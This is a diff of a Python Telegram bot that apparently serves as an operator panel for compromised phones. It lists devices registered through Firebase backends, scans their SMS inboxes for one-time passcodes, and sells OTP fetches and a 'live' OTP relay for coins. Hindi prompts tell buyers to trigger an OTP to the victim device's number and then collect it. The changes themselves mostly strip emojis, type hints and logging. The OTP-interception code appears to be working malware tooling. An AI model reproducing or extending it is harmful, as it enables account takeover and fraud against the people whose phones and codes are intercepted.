                     kb([(f"{sc('back')}", "owner:home")]))
 
 @R.callback_query(F.data == "owner:export_script")
-async def export_script(cq: CallbackQuery, state: FSMContext):
+async def export_script(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer("📤...")
@@ -4242,11 +4210,11 @@ async def export_script(cq: CallbackQuery, state: FSMContext):
     try:
         sp = os.path.abspath(__file__)
         await cq.message.reply_document(document=FSInputFile(sp),
-            caption=f"{em(EMOJI_GEAR, '📤')} <b>{_VERSION}</b>", parse_mode="HTML")
+            caption=f"📤 <b>{_VERSION}</b>", parse_mode="HTML")
     except Exception: pass
 
 # ============================================================
-#  GET OTP — user flow
+#  GET OTP FLOW
 # ============================================================
 def _otp_devices_kb(devices, page=0, prefix="otp"):
     per = 8; tp = max(1, (len(devices) + per - 1) // per)
@@ -4259,27 +4227,27 @@ def _otp_devices_kb(devices, page=0, prefix="otp"):
         ph = dv.get("phone") or "no number"
         rows.append([btn(f"{nm} · {ph}", f"{prefix}:dev:{idx}", EMOJI_PHONE, "📱")])
     nav = []
-    if page > 0: nav.append(btn("prev", f"{prefix}:pg:{page - 1}", EMOJI_GEAR, "◀️"))
-    if page < tp - 1: nav.append(btn("next", f"{prefix}:pg:{page + 1}", EMOJI_GEAR, "▶️"))
+    if page > 0: nav.append(btn("prev", f"{prefix}:pg:{page-1}", EMOJI_GEAR, "◀️"))
+    if page < tp - 1: nav.append(btn("next", f"{prefix}:pg:{page+1}", EMOJI_GEAR, "▶️"))
     if nav: rows.append(nav)
     rows.append([btn("back", "user:home", EMOJI_GEAR, "🔙")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
 @R.callback_query(F.data == "user:otp:menu")
-async def otp_menu(cq: CallbackQuery, state: FSMContext):
+async def otp_menu(cq, state):
     d = load(); uid = cq.from_user.id
     if is_banned(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     if not is_admin(uid, d) and not is_owner(uid, d):
         olim = get_user_otp_limit(uid, d)
         if olim is not None and olim <= 0:
-            try: await cq.answer("🚫 OTP blocked!", show_alert=True)
+            try: await cq.answer("🚫 OTP blocked!")
             except Exception: pass
             return
         if get_user_coins(uid, d) < 1:
-            try: await cq.answer("🪙 No coins!", show_alert=True)
+            try: await cq.answer("🪙 No coins!")
             except Exception: pass
             return
     try: await cq.answer()
@@ -4289,42 +4257,37 @@ async def otp_menu(cq: CallbackQuery, state: FSMContext):
         try: devices = await scan_all(d)
         except Exception: devices = []
     if not devices:
-        await safe_edit(cq, f"{em(EMOJI_WARNING, '😴')} <b>No devices online</b>",
-                        kb([(f"{sc('back')}", "user:home")]))
+        await safe_edit(cq, f"😴 <b>No devices online</b>", kb([(f"{sc('back')}", "user:home")]))
         return
     devices_sorted = sorted(devices, key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
     cost = get_otp_cost(d)
     await safe_edit(cq,
-        f"{em(EMOJI_OTP, '🔐')} <b>Get OTP</b>\n\n"
-        f"Devices online: <b>{len(devices_sorted)}</b>\n"
-        f"Cost: <b>{cost} 🪙</b> per fetch\n\n"
-        f"Select a device:",
+        f"🔐 <b>Get OTP</b>\n\nDevices online: <b>{len(devices_sorted)}</b>\n"
+        f"Cost: <b>{cost} 🪙</b> per fetch\n\nSelect:",
         _otp_devices_kb(devices_sorted, 0, "otp"))
 
 @R.callback_query(F.data.regexp(r"^otp:pg:(\d+)$"))
-async def otp_pg(cq: CallbackQuery, state: FSMContext):
+async def otp_pg(cq, state):
     try: await cq.answer()
     except Exception: pass
     p = int(cq.data.split(":")[-1])
     devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
     d = load(); cost = get_otp_cost(d)
     await safe_edit(cq,
-        f"{em(EMOJI_OTP, '🔐')} <b>Get OTP</b>\n\n"
-        f"Devices: <b>{len(devices)}</b> · Cost: <b>{cost} 🪙</b>\n\nSelect:",
+        f"🔐 <b>Get OTP</b>\n\nDevices: <b>{len(devices)}</b> · Cost: <b>{cost} 🪙</b>\n\nSelect:",
         _otp_devices_kb(devices, p, "otp"))
 
 @R.callback_query(F.data.regexp(r"^otp:dev:(\d+)$"))
-async def otp_dev_select(cq: CallbackQuery, state: FSMContext):
+async def otp_dev_select(cq, state):
     d = load(); uid = cq.from_user.id
     try: await cq.answer()
     except Exception: pass
     idx = int(cq.data.split(":")[-1])
     devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
     if idx >= len(devices):
-        try: await cq.answer("❌ Device gone!")
+        try: await cq.answer("❌ Gone!")
         except Exception: pass
-        await otp_menu(cq, state)
-        return
+        await otp_menu(cq, state); return
     dv = devices[idx]
     ph = dv.get("phone") or "Unknown"
     nm = str(dv.get("dev_name", "Device"))[:30]
@@ -4336,24 +4299,20 @@ async def otp_dev_select(cq: CallbackQuery, state: FSMContext):
         [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
     ]
     await safe_edit(cq,
-        f"{em(EMOJI_PHONE, '📱')} <b>Device</b>\n\n"
-        f"📛 Name: <b>{esc(nm)}</b>\n"
-        f"📞 Number: <code>{esc(ph)}</code>\n"
-        f"🔥 Firebase: {esc(fb)}\n"
-        f"🪙 Cost: <b>{cost}</b> per fetch\n\n"
-        f"<i>Us number pe OTP bhejwao, phir 'check otp' dabao.</i>",
+        f"📱 <b>Device</b>\n\n📛 Name: <b>{esc(nm)}</b>\n"
+        f"📞 Number: <code>{esc(ph)}</code>\n🔥 Firebase: {esc(fb)}\n"
+        f"🪙 Cost: <b>{cost}</b>\n\n<i>OTP bhejwao, phir 'check otp'.</i>",
         InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data.regexp(r"^otp:fetch:(\d+)$"))
-async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
+async def otp_fetch_now(cq, state):
     d = load(); uid = cq.from_user.id
     idx = int(cq.data.split(":")[-1])
     devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
     if idx >= len(devices):
         try: await cq.answer("❌ Gone!")
         except Exception: pass
-        await otp_menu(cq, state)
-        return
+        await otp_menu(cq, state); return
     dv = devices[idx]
     cost = get_otp_cost(d)
     is_priv = is_admin(uid, d) or is_owner(uid, d)
@@ -4369,13 +4328,11 @@ async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
             return
     try: await cq.answer("🔍")
     except Exception: pass
-    await safe_edit(cq, f"{em(EMOJI_OTP, '🔍')} <b>Scanning messages...</b>")
+    await safe_edit(cq, f"🔐 <b>Scanning messages...</b>")
 
-    # Get ALL messages and filter OTPs
-    all_msgs = await collect_all_messages(dv, limit=200)
+    all_msgs = await collect_all_messages(dv, limit=300)
     otps = [m for m in all_msgs if m["has_otp"]]
 
-    # charge coins
     if not is_priv:
         if not deduct_coins(uid, cost, d):
             try: await cq.answer("🪙 Insufficient!")
@@ -4383,7 +4340,6 @@ async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
             return
         k = str(uid)
         d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
-    # log
     if otps:
         first = otps[0]
         d.setdefault("otp_history", {}).setdefault(str(uid), []).append({
@@ -4399,13 +4355,13 @@ async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
             d["otp_history"][str(uid)] = d["otp_history"][str(uid)][-200:]
     save()
 
-    # build reply
     if not otps:
-        txt = (f"{em(EMOJI_CROSS, '❌')} <b>No OTP found</b>\n\n"
-               f"Device: <code>{esc(dv.get('phone') or 'no number')}</code>\n\n"
-               f"<i>Koi OTP message nahi mila. Live mode try karo — naye OTP aayenge to turant dikhenge.</i>")
+        txt = (f"❌ <b>No OTP found</b>\n\n"
+               f"📱 Device: <code>{esc(dv.get('phone') or 'no number')}</code>\n"
+               f"📊 Checked: <b>{len(all_msgs)}</b> messages\n\n"
+               f"<i>Koi OTP message nahi mila. Live mode try karo.</i>")
     else:
-        lines = [f"{em(EMOJI_OTP, '🔐')} <b>OTPs Found ({len(otps)})</b>\n"]
+        lines = [f"🔐 <b>OTPs Found ({len(otps)})</b>\n"]
         for i, o in enumerate(otps[:15], 1):
             otp_codes = ", ".join(o["otps"]) if o["otps"] else "?"
             body = esc(o["body"][:200])
@@ -4413,8 +4369,7 @@ async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
                 f"{i}. 🔐 <b>{otp_codes}</b>\n"
                 f"   📤 From: <b>{esc(o['sender'][:40])}</b>\n"
                 f"   🕐 {fmt_time_short(o['ts'])}\n"
-                f"   💬 <i>{body}</i>\n"
-            )
+                f"   💬 <i>{body}</i>\n")
         txt = "\n".join(lines)
     rows = [
         [btn("check again", f"otp:fetch:{idx}", EMOJI_OTP, "🔄", style="primary")],
@@ -4424,17 +4379,16 @@ async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
     if len(txt) > 4000: txt = txt[:3990] + "\n<i>...</i>"
     await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
 
-# ----- OTP LIVE -----
+# ----- LIVE MODE -----
 @R.callback_query(F.data.regexp(r"^otp:live:(\d+)$"))
-async def otp_live_start(cq: CallbackQuery, state: FSMContext):
+async def otp_live_start(cq, state):
     d = load(); uid = cq.from_user.id
     idx = int(cq.data.split(":")[-1])
     devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
     if idx >= len(devices):
         try: await cq.answer("❌ Gone!")
         except Exception: pass
-        await otp_menu(cq, state)
-        return
+        await otp_menu(cq, state); return
     dv = devices[idx]
     cost = get_otp_cost(d)
     is_priv = is_admin(uid, d) or is_owner(uid, d)
@@ -4445,16 +4399,12 @@ async def otp_live_start(cq: CallbackQuery, state: FSMContext):
             return
     try: await cq.answer("⏱ Live mode on!")
     except Exception: pass
-
     old = OTP_LIVE_SESSIONS.get(uid)
     if old and old.get("task") and not old["task"].done():
         old["task"].cancel()
-
-    # Mark existing messages as seen
     seen = set()
-    existing = await collect_all_messages(dv, limit=200)
+    existing = await collect_all_messages(dv, limit=300)
     for m in existing: seen.add(m["msg_id"])
-
     started = now_ts()
     sess = {"device": dv, "chat_id": cq.message.chat.id, "msg_id": cq.message.message_id,
             "started": started, "seen": seen, "cost": 0 if is_priv else cost, "task": None}
@@ -4464,7 +4414,7 @@ async def otp_live_start(cq: CallbackQuery, state: FSMContext):
         end = started + _OTP_LIVE_TIMEOUT
         while now_ts() < end:
             try:
-                cur = await collect_all_messages(dv, limit=200)
+                cur = await collect_all_messages(dv, limit=300)
                 found = []
                 for o in cur:
                     if o["msg_id"] in seen: continue
@@ -4476,12 +4426,9 @@ async def otp_live_start(cq: CallbackQuery, state: FSMContext):
                             d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
                         else:
                             try:
-                                await cq.bot.send_message(uid,
-                                    f"{em(EMOJI_COIN, '🪙')} <b>Out of coins!</b> Live mode stopped.",
-                                    parse_mode="HTML")
+                                await cq.bot.send_message(uid, f"🪙 <b>Out of coins!</b>", parse_mode="HTML")
                             except Exception: pass
-                            OTP_LIVE_SESSIONS.pop(uid, None)
-                            return
+                            OTP_LIVE_SESSIONS.pop(uid, None); return
                     found.append(o)
                     d.setdefault("otp_history", {}).setdefault(str(uid), []).append({
                         "otp": o["otps"][0] if o["otps"] else "?",
@@ -4496,7 +4443,7 @@ async def otp_live_start(cq: CallbackQuery, state: FSMContext):
                         d["otp_history"][str(uid)] = d["otp_history"][str(uid)][-200:]
                 if found:
                     save()
-                    txt = f"{em(EMOJI_OTP, '🔐')} <b>NEW OTP!</b>\n\n"
+                    txt = f"🔐 <b>NEW OTP!</b>\n\n"
                     for o in found[-5:]:
                         otp_codes = ", ".join(o["otps"]) if o["otps"] else "?"
                         txt += (f"🔐 <b>{otp_codes}</b>\n"
@@ -4507,35 +4454,31 @@ async def otp_live_start(cq: CallbackQuery, state: FSMContext):
                     txt += f"⏱ Live: {remaining // 60}m {remaining % 60}s left"
                     if len(txt) > 4000: txt = txt[:3990] + "\n<i>...</i>"
                     try:
-                        await cq.bot.edit_message_text(
-                            txt, chat_id=sess["chat_id"], message_id=sess["msg_id"],
-                            parse_mode="HTML")
+                        await cq.bot.edit_message_text(txt, chat_id=sess["chat_id"],
+                            message_id=sess["msg_id"], parse_mode="HTML")
                     except TelegramRetryAfter as e:
                         await asyncio.sleep(min(e.retry_after, 5))
                     except Exception: pass
-            except asyncio.CancelledError:
-                raise
-            except Exception:
-                pass
+            except asyncio.CancelledError: raise
+            except Exception: pass
             await asyncio.sleep(_OTP_POLL_INTERVAL)
         try:
             await cq.bot.edit_message_text(
-                f"{em(EMOJI_CLOCK, '⏱')} <b>Live mode ended</b>\n\nNo new OTP in {_OTP_LIVE_TIMEOUT // 60} min.",
+                f"⏱ <b>Live mode ended</b>\n\nNo new OTP in {_OTP_LIVE_TIMEOUT//60} min.",
                 chat_id=sess["chat_id"], message_id=sess["msg_id"],
                 reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                     [btn("check again", f"otp:fetch:{idx}", EMOJI_OTP, "🔄", style="primary")],
-                    [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")]
-                ]),
+                    [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")]]),
                 parse_mode="HTML")
         except Exception: pass
         OTP_LIVE_SESSIONS.pop(uid, None)
 
     t = asyncio.create_task(upd())
     sess["task"] = t
-    txt = (f"{em(EMOJI_CLOCK, '⏱')} <b>Live OTP Mode ON</b>\n\n"
+    txt = (f"⏱ <b>Live OTP Mode ON</b>\n\n"
            f"📞 <code>{esc(dv.get('phone') or 'no number')}</code>\n"
            f"📛 {esc(str(dv.get('dev_name', ''))[:30])}\n\n"
-           f"<i>Ab is device pe jo bhi naya OTP aayega, turant bhej dunga. {_OTP_LIVE_TIMEOUT // 60} min tak.</i>")
+           f"<i>Naye OTP turant bhej dunga. {_OTP_LIVE_TIMEOUT//60} min tak.</i>")
     rows = [
         [btn("stop live", "otp:live_stop", EMOJI_CROSS, "🛑", style="danger")],
         [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
@@ -4543,7 +4486,7 @@ async def otp_live_start(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "otp:live_stop")
-async def otp_live_stop(cq: CallbackQuery, state: FSMContext):
+async def otp_live_stop(cq, state):
     uid = cq.from_user.id
     sess = OTP_LIVE_SESSIONS.get(uid)
     if sess and sess.get("task") and not sess["task"].done():
@@ -4551,39 +4494,33 @@ async def otp_live_stop(cq: CallbackQuery, state: FSMContext):
     OTP_LIVE_SESSIONS.pop(uid, None)
     try: await cq.answer("🛑 Stopped!")
     except Exception: pass
-    await safe_edit(cq, f"{em(EMOJI_CROSS, '🛑')} <b>Live mode stopped</b>",
-                    kb([(f"{sc('back')}", "user:otp:menu")]))
+    await safe_edit(cq, f"🛑 <b>Live stopped</b>", kb([(f"{sc('back')}", "user:otp:menu")]))
 
 # ----- /logs -----
 @R.message(Command("logs"))
-async def cmd_logs(m: Message, state: FSMContext):
+async def cmd_logs(m, state):
     await state.clear()
     uid = m.from_user.id; d = load()
     if not is_owner(uid, d):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Owner only!", parse_mode="HTML"); return
+        await m.answer(f"❌ Owner only!", parse_mode="HTML"); return
     lines = ["=" * 60, "SANJIPRO BOT — LOG", "=" * 60]
     lines.append(f"Version: {_VERSION} | Power: {CURRENT_POWER_MODE}x")
-    lines.append(f"Owner: {get_owner_display(d) or '(hidden)'}")
     lines.append(f"Uptime: {fmt_duration(int(time.time() - _START_TIME))}")
-    lines.append(f"Last scan: {LAST_SCAN_DURATION:.2f}s | Count: {LAST_KNOWN_DEVICE_COUNT}")
-    lines.append("")
+    lines.append(f"Devices: {LAST_KNOWN_DEVICE_COUNT}")
     lines.append(f"[OWNERS] {d.get('owners', [])}")
     lines.append(f"[ADMINS] {d.get('admins', [])}")
     lines.append(f"[BANNED] {d.get('banned', [])}")
-    lines.append("")
     fbs = d.get("firebases", [])
     lines.append(f"[FIREBASES] {len(fbs)}")
     for fb in fbs[:50]:
         fc = FB_DEVICE_COUNTS.get(fb["id"], {})
         lines.append(f"  {fb.get('label', '?')} | {fb['url']} | online: {fc.get('online', 0)}")
-    lines.append("")
     users = d.get("users", {})
     lines.append(f"[USERS] {len(users)}")
     for us, ud in list(users.items())[:200]:
         lim = ud.get("max_send_limit"); ls = "unlim" if lim is None else str(lim)
         ol = ud.get("max_otp_limit"); ols = "unlim" if ol is None else str(ol)
         lines.append(f"  {us}: {ud.get('name', '?')} | c={ud.get('credits', 0)} | coin={ud.get('coins', 0)} | sms_lim={ls} | otp_lim={ols}")
-    lines.append("")
     st = d.get("stats", {})
     lines.append(f"[STATS] Sent={st.get('total_sent', 0)} Failed={st.get('total_failed', 0)}")
     lines.append("=" * 60)
@@ -4591,16 +4528,14 @@ async def cmd_logs(m: Message, state: FSMContext):
     fname = f"sanjipro_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
     try:
         await m.answer_document(document=BufferedInputFile(payload, filename=fname),
-                                caption=f"{em(EMOJI_GEAR, '📜')} <b>Log</b> — {_VERSION}",
-                                parse_mode="HTML")
+                                caption=f"📜 <b>Log</b> — {_VERSION}", parse_mode="HTML")
     except Exception as e:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} {esc(str(e)[:60])}", parse_mode="HTML")
+        await m.answer(f"❌ {esc(str(e)[:60])}", parse_mode="HTML")
 
 # ============================================================
-#  SHUTDOWN / SESSION
+#  SESSION
 # ============================================================
 async def _shutdown(bot):
-    log.info("Shutting down...")
     try:
         if _DATA_CACHE is not None: save(_DATA_CACHE)
     except Exception: pass
@@ -4614,7 +4549,6 @@ async def _shutdown(bot):
 async def run_session():
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
     dp = Dispatcher(storage=MemoryStorage())
-
     dp.callback_query.outer_middleware(CallbackSemaphoreMiddleware())
     dp.callback_query.outer_middleware(UserCooldownMiddleware())
     dp.callback_query.outer_middleware(OwnerPanelResetMiddleware())
@@ -4641,15 +4575,11 @@ async def run_session():
     _BG_TASKS.add(panel_task)
 
     try:
-        await bot.send_message(
-            MAIN_OWNER,
-            f"{em(EMOJI_ROCKET, '🚀')} <b>{_VERSION} Online</b>\n"
-            f"@{me.username}\n<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
-            f"PID: <code>{os.getpid()}</code>\n\n"
-            f"⚡ Mode: <b>{CURRENT_POWER_MODE}x</b>\n"
-            f"🪙 OTP Cost: <b>{get_otp_cost(load())}</b>\n"
-            f"🆓 Access: <b>Free for all</b>",
-            parse_mode="HTML", disable_web_page_preview=True)
+        await bot.send_message(MAIN_OWNER,
+            f"🚀 <b>{_VERSION} Online</b>\n@{me.username}\nPID: <code>{os.getpid()}</code>\n\n"
+            f"⚡ Mode: <b>{CURRENT_POWER_MODE}x</b>\n🪙 OTP: <b>{get_otp_cost(load())}</b>\n"
+            f"🆓 Access: <b>Free</b>",
+            parse_mode="HTML")
     except Exception: pass
 
     try:
@@ -4667,13 +4597,10 @@ async def main():
     attempt = 0
     while True:
         if _SHUTDOWN_REQUESTED:
-            log.info("[MAIN] Shutdown requested")
             _release_lock(); return
         attempt += 1
         try:
-            log.info(f"[MAIN] Session #{attempt}")
             await run_session()
-            log.warning("[MAIN] Session ended, restart in 5s")
             for _ in range(5):
                 if _SHUTDOWN_REQUESTED: break
                 await asyncio.sleep(1)
@@ -4687,7 +4614,7 @@ async def main():
             raise
         except Exception as e:
             backoff = min(5 + attempt * 2, 60)
-            log.error(f"[MAIN] Crash #{attempt}: {e} — restart in {backoff}s", exc_info=True)
+            log.error(f"[MAIN] Crash #{attempt}: {e}", exc_info=True)
             for _ in range(backoff):
                 if _SHUTDOWN_REQUESTED: break
                 await asyncio.sleep(1)
@@ -4695,9 +4622,7 @@ async def main():
 if __name__ == "__main__":
     def _sigterm_handler(signum, frame):
         global _SHUTDOWN_REQUESTED
-        log.warning(f"Signal {signum} — graceful shutdown")
         _SHUTDOWN_REQUESTED = True
-
     try: signal.signal(signal.SIGTERM, _sigterm_handler)
     except Exception: pass
     try: signal.signal(signal.SIGINT, _sigterm_handler)
@@ -4705,22 +4630,21 @@ if __name__ == "__main__":
 
     while True:
         if _SHUTDOWN_REQUESTED:
-            log.info("[BOOT] Clean exit"); _release_lock(); break
+            _release_lock(); break
         try:
             asyncio.run(main())
             if _SHUTDOWN_REQUESTED:
-                log.info("[BOOT] Clean shutdown"); _release_lock(); break
-            log.warning("[BOOT] Restart in 5s")
+                _release_lock(); break
             for _ in range(5):
                 if _SHUTDOWN_REQUESTED: break
                 time.sleep(1)
         except KeyboardInterrupt:
-            log.info("[BOOT] Stopped by user"); _release_lock(); break
+            _release_lock(); break
         except SystemExit:
             if _SHUTDOWN_REQUESTED: _release_lock()
             break
         except Exception as e:
-            log.critical(f"[BOOT] Fatal: {e} — restart in 10s", exc_info=True)
+            log.critical(f"[BOOT] Fatal: {e}", exc_info=True)
             for _ in range(10):
                 if _SHUTDOWN_REQUESTED: break
                 time.sleep(1)
